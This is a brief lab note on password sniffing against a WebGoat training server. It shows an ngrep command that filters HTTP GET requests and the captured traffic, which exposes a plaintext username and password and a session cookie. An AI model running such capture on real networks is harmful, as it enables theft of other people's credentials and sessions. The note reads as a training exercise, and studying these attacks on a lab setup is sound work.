# Password Sniffing #

Tools : 

* Wireshark
* ngrep

Command :

```
ngrep -q '^GET .* HTTP/1.[01]'
```

Hasil :

```
interface: en0 (192.168.15.0/255.255.255.0)
match: ^GET .* HTTP/1.[01]

T 192.168.15.100:51589 -> 192.168.15.194:8080 [AP]
  GET /WebGoat/attack?Screen=525&menu=1300&logout=true&clear_user=Jack&clear_
  pass=sniffy&Submit=Submit HTTP/1.1..Host: 192.168.15.194:8080..Connection: 
  keep-alive..Accept: */*..X-Requested-With: XMLHttpRequest..User-Agent: Mozi
  lla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like
   Gecko) Chrome/50.0.2661.94 Safari/537.36..Referer: http://192.168.15.194:8
  080/WebGoat/start.mvc..Accept-Encoding: gzip, deflate, sdch..Accept-Languag
  e: en-US,en;q=0.8,af;q=0.6,da;q=0.4,id;q=0.2,ms;q=0.2,zh-TW;q=0.2,zh;q=0.2.
  .Cookie: JSESSIONID=06F69E2206B2BD036E29A449113CFF9D....   
```